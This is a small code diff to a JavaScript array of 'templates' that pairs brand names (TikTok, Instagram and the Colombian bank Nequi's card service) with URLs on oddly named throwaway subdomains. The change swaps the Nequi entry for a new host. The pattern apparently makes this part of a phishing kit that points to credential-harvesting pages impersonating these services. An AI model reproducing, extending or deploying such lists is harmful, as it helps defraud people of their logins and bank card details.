@@ -580,7 +580,7 @@ const plantillas = [
 
   { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
 
-  { nombre: "Nequi Tarjeta", url: "https://nequi-tarjeta.glegogle5341-af7.workers.dev/" },
+  { nombre: "Nequi Tarjeta", url: "https://ufakmi.mimo.run/index.html" },
 
   { nombre: "Instagram", url: "https://instagram.glegogle5341-af7.workers.dev/" },
 
